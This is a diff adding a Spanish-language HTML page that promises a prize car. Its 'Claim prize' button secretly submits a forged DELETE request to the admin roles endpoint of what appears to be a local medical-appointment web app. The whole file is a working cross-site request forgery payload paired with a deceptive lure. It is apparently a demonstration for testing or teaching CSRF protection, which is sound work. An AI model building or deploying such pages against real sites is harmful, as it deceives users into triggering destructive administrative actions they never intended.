@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>¡Felicidades, ganaste!</title>
+</head>
+
+<body style="text-align: center; padding: 50px; font-family: sans-serif">
+    <h1>¡Felicidades, ganaste un coche!</h1>
+    <p>Haz clic en el boton para reclamar tu premio.</p>
+
+    <form 
+        action="http://medical-appointment-app.test/admin/roles" 
+        method="POST"
+    >
+        <input type="hidden" name="_method" value="DELETE">
+
+        <button type="submit" style="
+                background-color: green;
+                color: white;
+                padding: 15px 30px;
+                font-size: 20px;  
+                cursor: pointer;
+            "
+        >
+            Reclamar premio
+        </button>
+    </form>
+</body>
+
+</html>
